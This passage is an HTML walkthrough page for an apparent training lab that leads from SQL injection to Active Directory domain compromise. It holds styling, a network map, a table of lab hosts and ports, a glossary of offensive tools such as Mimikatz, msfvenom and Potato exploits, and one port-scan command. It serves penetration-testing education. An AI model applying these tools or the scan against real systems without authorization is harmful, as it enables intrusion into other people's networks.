@@ -1,0 +1,1391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MEDTECH // Operation Dossier</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;0,700;1,400&family=Public+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0D1219;
+    --bg-raise:#131A23;
+    --panel:#161E29;
+    --panel-alt:#1B2431;
+    --border:#28323F;
+    --border-soft:#1F2833;
+    --text:#E7EDF3;
+    --text-dim:#93A2B1;
+    --text-faint:#5C6B7A;
+    --why:#E3A23C;
+    --why-bg:rgba(227,162,60,0.09);
+    --why-bg-strong:rgba(227,162,60,0.16);
+    --concept:#49B4C9;
+    --concept-bg:rgba(73,180,201,0.09);
+    --concept-bg-strong:rgba(73,180,201,0.16);
+    --danger:#E2694B;
+    --danger-bg:rgba(226,105,75,0.1);
+    --success:#4FAE6D;
+    --success-bg:rgba(79,174,109,0.13);
+    --mono:'JetBrains Mono', ui-monospace, monospace;
+    --sans:'Public Sans', -apple-system, sans-serif;
+    --sidebar-w:290px;
+    --radius:3px;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--sans);
+    font-size:16px;
+    line-height:1.65;
+    -webkit-font-smoothing:antialiased;
+  }
+  ::selection{background:var(--why); color:#1a1204;}
+
+  a{color:var(--concept); text-decoration:none;}
+  a:hover{text-decoration:underline;}
+
+  code, .mono{font-family:var(--mono);}
+
+  /* ---------- Layout shell ---------- */
+  .shell{display:flex; min-height:100vh;}
+
+  .sidebar{
+    width:var(--sidebar-w);
+    flex-shrink:0;
+    position:fixed;
+    top:0; left:0; bottom:0;
+    background:var(--bg-raise);
+    border-right:1px solid var(--border-soft);
+    overflow-y:auto;
+    padding:22px 0 40px;
+    z-index:50;
+    transition:transform .25s ease;
+  }
+  .sidebar::-webkit-scrollbar{width:6px;}
+  .sidebar::-webkit-scrollbar-thumb{background:var(--border); border-radius:3px;}
+
+  .brand{
+    padding:0 22px 18px;
+    border-bottom:1px solid var(--border-soft);
+    margin-bottom:14px;
+  }
+  .brand .tag{
+    font-family:var(--mono); font-size:11px; letter-spacing:.14em; color:var(--why);
+    text-transform:uppercase; display:block; margin-bottom:6px;
+  }
+  .brand h1{
+    font-family:var(--mono); font-size:20px; margin:0; letter-spacing:.02em; font-weight:700;
+  }
+  .brand .sub{color:var(--text-faint); font-size:12.5px; margin-top:5px;}
+
+  .progress-block{padding:0 22px 18px; border-bottom:1px solid var(--border-soft); margin-bottom:8px;}
+  .progress-label{
+    display:flex; justify-content:space-between; font-family:var(--mono);
+    font-size:11px; color:var(--text-dim); margin-bottom:6px; letter-spacing:.04em;
+  }
+  .progress-label b{color:var(--success);}
+  .progress-track{height:6px; background:var(--panel-alt); border-radius:4px; overflow:hidden;}
+  .progress-fill{height:100%; width:0%; background:linear-gradient(90deg,var(--success),#7fd39a); transition:width .4s ease;}
+
+  nav.toc{padding:6px 10px;}
+  nav.toc .group-label{
+    font-family:var(--mono); font-size:10.5px; letter-spacing:.13em; text-transform:uppercase;
+    color:var(--text-faint); padding:14px 12px 6px;
+  }
+  nav.toc a{
+    display:flex; align-items:center; gap:8px;
+    padding:7px 12px; border-radius:var(--radius); color:var(--text-dim);
+    font-size:13.5px; margin:1px 0; border-left:2px solid transparent;
+  }
+  nav.toc a:hover{background:var(--panel); color:var(--text); text-decoration:none;}
+  nav.toc a.active{background:var(--panel-alt); color:var(--text); border-left-color:var(--why); font-weight:600;}
+  nav.toc a .dot{
+    width:6px; height:6px; border-radius:50%; background:var(--border); flex-shrink:0;
+  }
+  nav.toc a.done .dot{background:var(--success);}
+  nav.toc a .n{color:var(--text-faint); font-family:var(--mono); font-size:11px; width:16px; flex-shrink:0;}
+
+  .mobile-bar{display:none;}
+
+  main{
+    margin-left:var(--sidebar-w);
+    flex:1;
+    max-width:900px;
+    padding:0 56px 120px;
+  }
+
+  /* ---------- Hero ---------- */
+  .hero{
+    padding:72px 0 30px;
+    border-bottom:1px solid var(--border-soft);
+    margin-bottom:40px;
+  }
+  .hero .eyebrow{
+    font-family:var(--mono); font-size:12px; letter-spacing:.18em; text-transform:uppercase;
+    color:var(--why); margin-bottom:16px; display:flex; align-items:center; gap:10px;
+  }
+  .hero .eyebrow::before{content:''; width:26px; height:1px; background:var(--why); display:inline-block;}
+  .hero h1{
+    font-family:var(--mono); font-size:44px; line-height:1.1; margin:0 0 18px; font-weight:700;
+    letter-spacing:-.01em;
+  }
+  .hero h1 span{color:var(--text-faint);}
+  .hero p.lede{font-size:18px; color:var(--text-dim); max-width:640px; margin:0 0 22px;}
+  .hero .thesis{
+    border-left:3px solid var(--why); padding:14px 18px; background:var(--why-bg);
+    font-size:15.5px; color:var(--text); max-width:640px; border-radius:0 var(--radius) var(--radius) 0;
+  }
+  .hero .thesis b{color:var(--why);}
+
+  .controlpanel{
+    background:var(--panel); border:1px solid var(--border); border-radius:4px;
+    padding:14px 20px; margin:28px 0 44px;
+  }
+  .cp-row{display:flex; align-items:center; justify-content:space-between; gap:20px; flex-wrap:wrap;}
+  .cp-legend{font-size:13px; color:var(--text-dim); display:flex; align-items:center; gap:6px; flex-wrap:wrap;}
+  .cp-chip{
+    font-family:var(--mono); font-size:11.5px; padding:2px 9px; border-radius:20px; font-weight:600;
+  }
+  .cp-chip.why-chip{color:var(--why); border:1px solid rgba(227,162,60,0.35); background:var(--why-bg);}
+  .cp-chip.concept-chip{color:var(--concept); border:1px solid rgba(73,180,201,0.35); background:var(--concept-bg);}
+  .cp-actions{display:flex; gap:8px; flex-shrink:0;}
+  .cp-btn{
+    font-family:var(--mono); font-size:11.5px; background:var(--panel-alt); color:var(--text-dim);
+    border:1px solid var(--border); padding:6px 12px; border-radius:3px; cursor:pointer; white-space:nowrap;
+  }
+  .cp-btn:hover{color:var(--text); border-color:var(--text-faint);}
+  .cp-note{margin:10px 0 0; font-size:12.5px;}
+
+  /* ---------- Sections ---------- */
+  section.block{scroll-margin-top:26px; margin-bottom:56px;}
+  .phase-head{
+    display:flex; align-items:baseline; gap:14px; margin-bottom:6px; padding-top:6px;
+  }
+  .phase-head .idx{font-family:var(--mono); font-size:14px; color:var(--why);}
+  h2{font-family:var(--mono); font-size:26px; margin:0; font-weight:700; letter-spacing:-.01em;}
+  .phase-desc{color:var(--text-dim); font-size:15px; margin:10px 0 26px; max-width:620px;}
+
+  h3{font-family:var(--mono); font-size:18px; margin:30px 0 10px; font-weight:600; color:var(--text);}
+  h4.step{
+    font-family:var(--mono); font-size:14.5px; margin:26px 0 10px; font-weight:600; color:var(--text);
+    display:flex; align-items:center; gap:8px; position:relative;
+    counter-increment:stepnum;
+  }
+  h4.step::before{
+    content:counter(stepnum); position:absolute; left:-45px; top:-2px;
+    width:22px; height:22px; border-radius:50%; background:var(--bg-raise); border:2px solid var(--why);
+    color:var(--why); font-size:11px; display:flex; align-items:center; justify-content:center;
+  }
+
+  p{margin:0 0 14px; color:var(--text);}
+  p.dim{color:var(--text-dim);}
+  ul, ol{margin:0 0 14px; padding-left:22px;}
+  li{margin-bottom:6px;}
+  strong{color:#fff; font-weight:700;}
+  code.inline{
+    background:var(--panel-alt); border:1px solid var(--border-soft); padding:1px 6px;
+    border-radius:3px; font-size:.86em; color:#F0C987;
+  }
+
+  /* ---------- Code blocks ---------- */
+  .codebox{
+    position:relative; background:#0A0F15; border:1px solid var(--border-soft);
+    border-radius:var(--radius); margin:14px 0 18px; overflow:hidden;
+  }
+  .codebox .cb-head{
+    display:flex; justify-content:space-between; align-items:center;
+    padding:7px 12px; background:#0F151C; border-bottom:1px solid var(--border-soft);
+    font-family:var(--mono); font-size:11px; color:var(--text-faint); letter-spacing:.04em;
+  }
+  .codebox pre{
+    margin:0; padding:14px 16px; overflow-x:auto; font-family:var(--mono);
+    font-size:13px; line-height:1.6; color:#D6E1EC;
+  }
+  .copy-btn{
+    background:var(--panel-alt); border:1px solid var(--border); color:var(--text-dim);
+    font-family:var(--mono); font-size:11px; padding:3px 9px; border-radius:3px; cursor:pointer;
+    transition:.15s;
+  }
+  .copy-btn:hover{background:var(--border); color:var(--text);}
+  .copy-btn.copied{color:var(--success); border-color:var(--success);}
+
+  /* ---------- Callouts (compact by default; expand on click) ---------- */
+  .callout{
+    margin:10px 0; border-radius:var(--radius);
+  }
+  .callout .co-head{
+    display:inline-flex; align-items:center; gap:7px; cursor:pointer;
+    font-family:var(--mono); font-weight:600; font-size:12.5px; user-select:none;
+    padding:5px 12px 5px 6px; border-radius:20px; border:1px solid var(--border);
+    background:var(--panel); color:var(--text-dim); transition:.15s;
+  }
+  .callout .co-head:hover{border-color:var(--text-faint); color:var(--text);}
+  .callout .co-head .chev{font-size:9px; opacity:.5; transition:transform .2s;}
+  .callout.open .co-head .chev{transform:rotate(180deg);}
+  .callout .co-body{display:none; padding:12px 16px 13px 16px; font-size:14px; color:var(--text); margin-top:4px;}
+  .callout .co-body p:last-child{margin-bottom:0;}
+  .callout.open .co-body{display:block;}
+  .callout .icon{
+    width:17px; height:17px; border-radius:50%; display:flex; align-items:center; justify-content:center;
+    font-size:10px; flex-shrink:0;
+  }
+
+  .callout.why .co-head{border-color:rgba(227,162,60,0.35); color:var(--why);}
+  .callout.why .icon{background:var(--why-bg-strong); color:var(--why);}
+  .callout.why.open{background:var(--why-bg); border-left:2px solid var(--why); border-radius:0 var(--radius) var(--radius) 0;}
+  .callout.why.open .co-head{border-radius:20px 20px 0 0; border-bottom:none; background:var(--why-bg-strong);}
+
+  .callout.concept .co-head{border-color:rgba(73,180,201,0.35); color:var(--concept);}
+  .callout.concept .icon{background:var(--concept-bg-strong); color:var(--concept);}
+  .callout.concept.open{background:var(--concept-bg); border-left:2px solid var(--concept); border-radius:0 var(--radius) var(--radius) 0;}
+  .callout.concept.open .co-head{border-radius:20px 20px 0 0; border-bottom:none; background:var(--concept-bg-strong);}
+
+  /* ---------- Tables ---------- */
+  table{width:100%; border-collapse:collapse; margin:14px 0 22px; font-size:14px;}
+  th{
+    text-align:left; font-family:var(--mono); font-size:11px; letter-spacing:.06em; text-transform:uppercase;
+    color:var(--text-faint); padding:9px 12px; border-bottom:1px solid var(--border);
+  }
+  td{padding:9px 12px; border-bottom:1px solid var(--border-soft); color:var(--text-dim);}
+  tr:hover td{color:var(--text); background:var(--panel);}
+  td.mono-cell{font-family:var(--mono); font-size:13px; color:var(--text);}
+
+  /* ---------- Host cards ---------- */
+  .host-card{
+    border:1px solid var(--border); border-radius:4px; margin:20px 0 34px; overflow:hidden;
+    background:var(--panel);
+  }
+  .host-card .hc-head{
+    display:flex; align-items:center; gap:14px; padding:16px 20px; cursor:pointer;
+    background:var(--panel-alt); border-bottom:1px solid var(--border);
+  }
+  .host-card .hc-tag{
+    font-family:var(--mono); font-size:11px; color:var(--bg); background:var(--why);
+    padding:3px 8px; border-radius:3px; font-weight:700; letter-spacing:.03em; flex-shrink:0;
+  }
+  .host-card.done .hc-tag{background:var(--success);}
+  .host-card .hc-titles{flex:1;}
+  .host-card .hc-titles .hc-ip{font-family:var(--mono); font-size:12px; color:var(--text-faint);}
+  .host-card .hc-titles h3{margin:2px 0 0; font-size:17px;}
+  .host-card .hc-status{
+    font-family:var(--mono); font-size:11px; color:var(--text-faint); border:1px solid var(--border);
+    padding:5px 10px; border-radius:3px; cursor:pointer; white-space:nowrap; transition:.15s;
+  }
+  .host-card.done .hc-status{color:var(--success); border-color:var(--success); background:var(--success-bg);}
+  .host-card .hc-chev{font-size:12px; color:var(--text-faint); transition:transform .2s;}
+  .host-card.collapsed .hc-chev{transform:rotate(-90deg);}
+  .host-card .hc-body{
+    padding:24px 24px 6px 34px; position:relative;
+    border-left:2px solid var(--border-soft); margin:0 24px 0 34px;
+    counter-reset:stepnum;
+  }
+  .host-card.collapsed .hc-body{display:none;}
+
+  .badge-row{margin:0 0 14px;}
+  .badge-row .badge{
+    font-family:var(--mono); font-size:11px; color:var(--text-faint); margin-right:14px;
+  }
+  .badge-row .badge::before{content:'· '; color:var(--border);}
+  .badge-row .badge:first-child::before{content:'';}
+
+  .next-target{
+    display:flex; align-items:center; justify-content:space-between; gap:14px;
+    margin:26px 0 22px -34px; padding:14px 20px; background:var(--panel-alt);
+    border:1px solid var(--border); border-radius:4px; text-decoration:none;
+  }
+  .next-target:hover{border-color:var(--why); text-decoration:none;}
+  .next-target .nt-label{font-family:var(--mono); font-size:11px; color:var(--text-faint); letter-spacing:.05em; text-transform:uppercase; display:block;}
+  .next-target .nt-name{color:var(--text); font-size:15px; font-weight:600; margin-top:2px; display:block;}
+  .next-target .nt-arrow{color:var(--why); font-size:18px;}
+
+  /* ---------- Network map (signature element) ---------- */
+  .mapwrap{
+    border:1px solid var(--border); border-radius:4px; background:var(--panel);
+    padding:22px; margin:22px 0 30px;
+  }
+  .mapwrap .maphead{
+    display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;
+  }
+  .mapwrap .maphead .mh-title{font-family:var(--mono); font-size:12px; color:var(--text-faint); letter-spacing:.06em; text-transform:uppercase;}
+  .legend{display:flex; gap:16px; font-family:var(--mono); font-size:11px; color:var(--text-faint);}
+  .legend span{display:flex; align-items:center; gap:5px;}
+  .legend i{width:9px; height:9px; border-radius:50%; display:inline-block;}
+  #netmap{width:100%; height:auto; display:block;}
+  #netmap .zone-label{font-family:var(--mono); font-size:11px; fill:var(--text-faint); letter-spacing:.05em;}
+  #netmap .link{stroke:var(--border); stroke-width:1.4; fill:none;}
+  #netmap .link.active-link{stroke:var(--success); stroke-width:1.8;}
+  #netmap .node circle{
+    fill:var(--panel-alt); stroke:var(--border); stroke-width:1.6; cursor:pointer; transition:.2s;
+  }
+  #netmap .node:hover circle{stroke:var(--why);}
+  #netmap .node.done circle{fill:var(--success-bg); stroke:var(--success);}
+  #netmap .node text.lbl{
+    font-family:var(--mono); font-size:10.5px; fill:var(--text-dim); pointer-events:none;
+  }
+  #netmap .node text.ip{
+    font-family:var(--mono); font-size:8.5px; fill:var(--text-faint); pointer-events:none;
+  }
+  #netmap .node.done text.lbl{fill:var(--text);}
+  #netmap .zoneframe{fill:none; stroke:var(--border-soft); stroke-dasharray:3 4;}
+
+  /* ---------- Checklist (debrief) ---------- */
+  .checklist{list-style:none; padding:0; margin:0;}
+  .checklist li{
+    display:flex; gap:12px; align-items:flex-start; padding:12px 14px; border:1px solid var(--border);
+    border-radius:3px; margin-bottom:8px; cursor:pointer; background:var(--panel); transition:.15s;
+  }
+  .checklist li:hover{border-color:var(--text-faint);}
+  .checklist li.checked{background:var(--success-bg); border-color:var(--success);}
+  .checklist .box{
+    width:18px; height:18px; border:1.6px solid var(--text-faint); border-radius:3px; flex-shrink:0;
+    margin-top:2px; display:flex; align-items:center; justify-content:center; font-size:12px; color:transparent;
+  }
+  .checklist li.checked .box{background:var(--success); border-color:var(--success); color:#08130c;}
+  .checklist li span.txt{color:var(--text-dim); font-size:14.5px;}
+  .checklist li.checked span.txt{color:var(--text);}
+  .checklist li b{color:#fff;}
+  .checklist li.checked b{color:var(--success);}
+
+  .mastery{
+    display:flex; align-items:center; gap:18px; margin:26px 0 8px; padding:18px 22px;
+    border:1px solid var(--border); border-radius:4px; background:var(--panel-alt);
+  }
+  .mastery .ring{position:relative; width:64px; height:64px; flex-shrink:0;}
+  .mastery .ring svg{transform:rotate(-90deg);}
+  .mastery .ring .pct{
+    position:absolute; inset:0; display:flex; align-items:center; justify-content:center;
+    font-family:var(--mono); font-size:14px; font-weight:700; color:var(--success);
+  }
+  .mastery .mtext{font-size:14px; color:var(--text-dim);}
+  .mastery .mtext b{color:var(--text); display:block; font-family:var(--mono); font-size:13px; margin-bottom:3px;}
+
+  hr.rule{border:none; border-top:1px solid var(--border-soft); margin:40px 0;}
+
+  .flag{
+    display:inline-flex; align-items:center; gap:6px; font-family:var(--mono); font-size:12px;
+    color:var(--why); background:var(--why-bg); border:1px solid rgba(227,162,60,.3);
+    padding:3px 9px; border-radius:3px; margin:4px 0;
+  }
+
+  footer{
+    margin-left:var(--sidebar-w); padding:30px 56px 60px; color:var(--text-faint);
+    font-size:12.5px; font-family:var(--mono); border-top:1px solid var(--border-soft);
+  }
+
+  .toolgrid{display:grid; grid-template-columns:repeat(2,1fr); gap:10px; margin:16px 0 4px;}
+
+  details.disclosure{
+    border:1px solid var(--border); border-radius:4px; margin:14px 0; background:var(--panel);
+  }
+  details.disclosure summary{
+    font-family:var(--mono); font-size:13px; color:var(--text-dim); padding:12px 16px;
+    cursor:pointer; list-style:none; user-select:none; display:flex; align-items:center; gap:8px;
+  }
+  details.disclosure summary::-webkit-details-marker{display:none;}
+  details.disclosure summary::before{content:'▸'; color:var(--why); font-size:11px; transition:transform .15s;}
+  details.disclosure[open] summary::before{transform:rotate(90deg);}
+  details.disclosure summary:hover{color:var(--text);}
+  details.disclosure[open] summary{border-bottom:1px solid var(--border);}
+  details.disclosure > table, details.disclosure > .toolgrid{margin:14px 16px 16px;}
+  details.disclosure > table{width:calc(100% - 32px);}
+  .toolcard{border:1px solid var(--border); border-radius:3px; padding:12px 14px; background:var(--panel);}
+  .toolcard .tname{font-family:var(--mono); font-size:13px; color:var(--why); margin-bottom:4px; font-weight:600;}
+  .toolcard .tdesc{font-size:13px; color:var(--text-dim); line-height:1.5;}
+
+  @media (max-width:1000px){
+    :root{--sidebar-w:250px;}
+    main{padding:0 30px 100px;}
+    .toolgrid{grid-template-columns:1fr;}
+  }
+  @media (max-width:820px){
+    .sidebar{transform:translateX(-100%); width:280px;}
+    .sidebar.open{transform:translateX(0); box-shadow:20px 0 40px rgba(0,0,0,.4);}
+    main, footer{margin-left:0;}
+    .mobile-bar{
+      display:flex; position:sticky; top:0; z-index:60; background:var(--bg-raise);
+      border-bottom:1px solid var(--border-soft); padding:12px 16px; align-items:center; gap:12px;
+    }
+    .mobile-bar button{
+      background:var(--panel-alt); border:1px solid var(--border); color:var(--text);
+      font-family:var(--mono); font-size:12px; padding:6px 10px; border-radius:3px;
+    }
+    .mobile-bar .mb-title{font-family:var(--mono); font-size:13px; color:var(--why);}
+    .scrim{display:none; position:fixed; inset:0; background:rgba(0,0,0,.5); z-index:40;}
+    .scrim.show{display:block;}
+    .hero h1{font-size:30px;}
+    .hero{padding:34px 0 24px;}
+    main{padding:0 18px 80px;}
+    .host-card .hc-body{margin:0 10px 0 20px; padding:18px 14px 6px 20px;}
+    h4.step::before{left:-28px; width:18px; height:18px; font-size:10px;}
+    .next-target{margin-left:-20px;}
+    .cp-row{flex-direction:column; align-items:flex-start;}
+  }
+</style>
+</head>
+<body>
+
+<div class="mobile-bar">
+  <button id="navToggle">☰ MENU</button>
+  <span class="mb-title">MEDTECH // DOSSIER</span>
+</div>
+<div class="scrim" id="scrim"></div>
+
+<div class="shell">
+
+  <aside class="sidebar" id="sidebar">
+    <div class="brand">
+      <span class="tag">Operation Dossier</span>
+      <h1>MEDTECH</h1>
+      <div class="sub">SQLi → Domain Admin, guided</div>
+    </div>
+
+    <div class="progress-block">
+      <div class="progress-label"><span>Hosts compromised</span><b id="progressText">0 / 10</b></div>
+      <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+    </div>
+
+    <nav class="toc">
+      <div class="group-label">Briefing</div>
+      <a href="#overview"><span class="dot"></span>Overview</a>
+      <a href="#network-tools"><span class="dot"></span>Network &amp; Tools</a>
+
+      <div class="group-label">Phase 1 — External</div>
+      <a href="#recon"><span class="dot"></span>Recon</a>
+      <a href="#host-web02" data-host="web02"><span class="dot"></span><span class="n">01</span>WEB02 · Foothold</a>
+      <a href="#host-vpn122" data-host="vpn122"><span class="dot"></span><span class="n">02</span>VPN Host</a>
+
+      <div class="group-label">Phase 2 — Field Manual</div>
+      <a href="#concepts"><span class="dot"></span>Concept Deep-Dives</a>
+
+      <div class="group-label">Phase 3 — Internal</div>
+      <a href="#host-linux14" data-host="linux14"><span class="dot"></span><span class="n">03</span>172.16.247.14</a>
+      <a href="#host-files02" data-host="files02"><span class="dot"></span><span class="n">04</span>FILES02</a>
+      <a href="#host-client02" data-host="client02"><span class="dot"></span><span class="n">05</span>CLIENT02</a>
+      <a href="#host-client01" data-host="client01"><span class="dot"></span><span class="n">06</span>CLIENT01</a>
+      <a href="#host-dev04" data-host="dev04"><span class="dot"></span><span class="n">07</span>DEV04</a>
+      <a href="#host-prod01" data-host="prod01"><span class="dot"></span><span class="n">08</span>PROD01</a>
+      <a href="#host-dc01" data-host="dc01"><span class="dot"></span><span class="n">09</span>DC01</a>
+      <a href="#host-web01" data-host="web01"><span class="dot"></span><span class="n">10</span>WEB01 · Closing</a>
+
+      <div class="group-label">Debrief</div>
+      <a href="#debrief"><span class="dot"></span>What You Should Know</a>
+    </nav>
+  </aside>
+
+  <main>
+
+    <!-- ============ HERO / OVERVIEW ============ -->
+    <section class="hero" id="overview">
+      <div class="eyebrow">Beginner-Friendly · Reasoning-First</div>
+      <h1>MEDTECH<span> // Operation Dossier</span></h1>
+      <p class="lede">A guided walkthrough from a single SQL injection to full Active Directory domain compromise — built around one question you should keep asking at every step.</p>
+      <div class="thesis"><b>“Why this, why now?”</b> Every host, tool, and pivot in this lab exists because something you found earlier pointed you there. Amber boxes call that reasoning out explicitly. Read them as carefully as the commands.</div>
+    </section>
+
+    <section class="block controlpanel">
+      <div class="cp-row">
+        <div class="cp-legend">
+          <span class="cp-chip why-chip">? Why</span> reasoning, collapsed by default —
+          <span class="cp-chip concept-chip">i Concept</span> primers, same —
+          click any chip to expand it inline.
+        </div>
+        <div class="cp-actions">
+          <button class="cp-btn" id="expandAllReasoning">Expand all reasoning</button>
+          <button class="cp-btn" id="collapseAllReasoning">Collapse all</button>
+        </div>
+      </div>
+      <p class="dim cp-note">Host cards open one at a time — click a card's header, a network-map node, or a <span class="mono">Next Target</span> button to move through the lab in order.</p>
+    </section>
+
+    <!-- ============ NETWORK & TOOLS ============ -->
+    <section class="block" id="network-tools">
+      <div class="phase-head"><span class="idx">§0</span><h2>Network &amp; Tools</h2></div>
+      <p class="phase-desc">The scenario: Medtech has a public DMZ and an internal Active Directory domain behind it. Nothing here is arbitrary — every move follows from evidence gathered in the move before it.</p>
+
+      <div class="mapwrap">
+        <div class="maphead">
+          <span class="mh-title">Live Topology — click a node</span>
+          <div class="legend">
+            <span><i style="background:var(--panel-alt); border:1.6px solid var(--border);"></i>Untouched</span>
+            <span><i style="background:var(--success-bg); border:1.6px solid var(--success);"></i>Compromised</span>
+          </div>
+        </div>
+        <svg id="netmap" viewBox="0 0 860 380" xmlns="http://www.w3.org/2000/svg">
+          <rect class="zoneframe" x="10" y="10" width="840" height="110" rx="4"></rect>
+          <text class="zone-label" x="20" y="30">EXTERNAL / DMZ — 192.168.247.0/24</text>
+          <rect class="zoneframe" x="10" y="150" width="840" height="220" rx="4"></rect>
+          <text class="zone-label" x="20" y="170">INTERNAL / DOMAIN — 172.16.247.0/24 (reachable only via pivot)</text>
+
+          <!-- links: pivot from vpn122 and web02 down into internal cluster -->
+          <path class="link" id="link-pivot1" d="M140,95 C140,150 120,150 120,190"></path>
+          <path class="link" id="link-pivot2" d="M430,95 C430,150 400,150 400,190"></path>
+          <path class="link" d="M120,230 L260,230"></path>
+          <path class="link" d="M260,230 L400,230"></path>
+          <path class="link" d="M400,230 L540,230"></path>
+          <path class="link" d="M540,230 L680,230"></path>
+          <path class="link" d="M260,230 L260,320"></path>
+          <path class="link" d="M540,230 L540,320"></path>
+
+          <!-- external nodes -->
+          <g class="node" data-host="web01" transform="translate(120,65)">
+            <circle r="22"></circle>
+            <text class="lbl" text-anchor="middle" y="4">WEB01</text>
+            <text class="ip" text-anchor="middle" y="-30">.120</text>
+          </g>
+          <g class="node" data-host="web02" transform="translate(280,65)">
+            <circle r="22"></circle>
+            <text class="lbl" text-anchor="middle" y="4">WEB02</text>
+            <text class="ip" text-anchor="middle" y="-30">.121</text>
+          </g>
+          <g class="node" data-host="vpn122" transform="translate(430,65)">
+            <circle r="22"></circle>
+            <text class="lbl" text-anchor="middle" y="4">VPN</text>
+            <text class="ip" text-anchor="middle" y="-30">.122</text>
+          </g>
+
+          <!-- internal nodes -->
+          <g class="node" data-host="linux14" transform="translate(120,230)">
+            <circle r="20"></circle>
+            <text class="lbl" text-anchor="middle" y="4">.14</text>
+            <text class="ip" text-anchor="middle" y="-28">linux</text>
+          </g>
+          <g class="node" data-host="files02" transform="translate(260,230)">
+            <circle r="20"></circle>
+            <text class="lbl" text-anchor="middle" y="4">FILES02</text>
+            <text class="ip" text-anchor="middle" y="-28">.11</text>
+          </g>
+          <g class="node" data-host="dc01" transform="translate(400,230)">
+            <circle r="22"></circle>
+            <text class="lbl" text-anchor="middle" y="4">DC01</text>
+            <text class="ip" text-anchor="middle" y="-30">.10</text>
+          </g>
+          <g class="node" data-host="prod01" transform="translate(540,230)">
+            <circle r="20"></circle>
+            <text class="lbl" text-anchor="middle" y="4">PROD01</text>
+            <text class="ip" text-anchor="middle" y="-28">.13</text>
+          </g>
+          <g class="node" data-host="dev04" transform="translate(680,230)">
+            <circle r="20"></circle>
+            <text class="lbl" text-anchor="middle" y="4">DEV04</text>
+            <text class="ip" text-anchor="middle" y="-28">.12</text>
+          </g>
+          <g class="node" data-host="client01" transform="translate(260,320)">
+            <circle r="20"></circle>
+            <text class="lbl" text-anchor="middle" y="4">CLIENT01</text>
+            <text class="ip" text-anchor="middle" y="-28">.82</text>
+          </g>
+          <g class="node" data-host="client02" transform="translate(540,320)">
+            <circle r="20"></circle>
+            <text class="lbl" text-anchor="middle" y="4">CLIENT02</text>
+            <text class="ip" text-anchor="middle" y="-28">.83</text>
+          </g>
+        </svg>
+      </div>
+
+      <details class="disclosure">
+        <summary>Full port / role table (same data as the map above)</summary>
+        <table>
+          <thead><tr><th>IP</th><th>Hostname</th><th>Open Ports</th><th>Role</th></tr></thead>
+          <tbody>
+            <tr><td class="mono-cell">192.168.247.120</td><td>WEB01</td><td class="mono-cell">22, 80</td><td>Linux web server</td></tr>
+            <tr><td class="mono-cell">192.168.247.121</td><td>WEB02</td><td class="mono-cell">80,135,139,445,5985</td><td>Windows web (IIS + MSSQL)</td></tr>
+            <tr><td class="mono-cell">192.168.247.122</td><td>VPN</td><td class="mono-cell">22</td><td>Linux jump/VPN box</td></tr>
+            <tr><td class="mono-cell">172.16.247.10</td><td>DC01</td><td class="mono-cell">53,88,135,139,445,5985</td><td>Domain Controller</td></tr>
+            <tr><td class="mono-cell">172.16.247.11</td><td>FILES02</td><td class="mono-cell">135,445,5985</td><td>File server</td></tr>
+            <tr><td class="mono-cell">172.16.247.12</td><td>DEV04</td><td class="mono-cell">139,445,3389,5985</td><td>Dev workstation</td></tr>
+            <tr><td class="mono-cell">172.16.247.13</td><td>PROD01</td><td class="mono-cell">135,445,5985</td><td>Production server</td></tr>
+            <tr><td class="mono-cell">172.16.247.14</td><td>(unnamed)</td><td class="mono-cell">22</td><td>Linux host</td></tr>
+            <tr><td class="mono-cell">172.16.247.82</td><td>CLIENT01</td><td class="mono-cell">135,445,3389</td><td>Workstation</td></tr>
+            <tr><td class="mono-cell">172.16.247.83</td><td>CLIENT02</td><td class="mono-cell">135,445,5985</td><td>Workstation</td></tr>
+          </tbody>
+        </table>
+      </details>
+
+      <details class="disclosure">
+        <summary>Tool glossary — 12 tools, read once and refer back</summary>
+        <div class="toolgrid">
+          <div class="toolcard"><div class="tname">nmap / rustscan</div><div class="tdesc">Port scanners — tell you what services are running on a target.</div></div>
+          <div class="toolcard"><div class="tname">sqlmap</div><div class="tdesc">Automates finding and exploiting SQL injection.</div></div>
+          <div class="toolcard"><div class="tname">msfvenom</div><div class="tdesc">Generates malicious executables ("payloads") like reverse shells.</div></div>
+          <div class="toolcard"><div class="tname">netcat (nc)</div><div class="tdesc">The Swiss-army-knife of networking; catches simple reverse shells.</div></div>
+          <div class="toolcard"><div class="tname">WinPEAS</div><div class="tdesc">Automatically hunts for common Windows privesc misconfigurations.</div></div>
+          <div class="toolcard"><div class="tname">Potato exploits</div><div class="tdesc">JuicyPotato / PrintSpoofer — abuse SeImpersonatePrivilege to jump to SYSTEM.</div></div>
+          <div class="toolcard"><div class="tname">Mimikatz</div><div class="tdesc">Extracts plaintext passwords, hashes, tickets from Windows memory.</div></div>
+          <div class="toolcard"><div class="tname">NetExec (nxc)</div><div class="tdesc">Tests one credential against SMB/WinRM/RDP across many hosts at once.</div></div>
+          <div class="toolcard"><div class="tname">Evil-WinRM</div><div class="tdesc">Turns valid creds + open WinRM (5985) into an interactive shell.</div></div>
+          <div class="toolcard"><div class="tname">psexec.py</div><div class="tdesc">Turns valid creds + open SMB (445) into a SYSTEM-level shell.</div></div>
+          <div class="toolcard"><div class="tname">hashcat</div><div class="tdesc">Cracks stolen password hashes back into plaintext, offline.</div></div>
+          <div class="toolcard"><div class="tname">Ligolo-ng</div><div class="tdesc">Tunnels your machine's traffic into a network you've only got one foothold in.</div></div>
+        </div>
+      </details>
+    </section>
+
+    <!-- ============ PHASE 1 ============ -->
+    <hr class="rule">
+    <section class="block" id="recon">
+      <div class="phase-head"><span class="idx">§1</span><h2>Phase 1 — External Network</h2></div>
+      <p class="phase-desc">Start broad. Every engagement begins the same way: you don't know anything yet, so you scan everything reachable.</p>
+
+      <div class="codebox">
+        <div class="cb-head"><span>bash</span><button class="copy-btn">Copy</button></div>
+        <pre>rustscan -a 192.168.247.120,192.168.247.121,192.168.247.122 -- -sV -sC</pre>
+      </div>
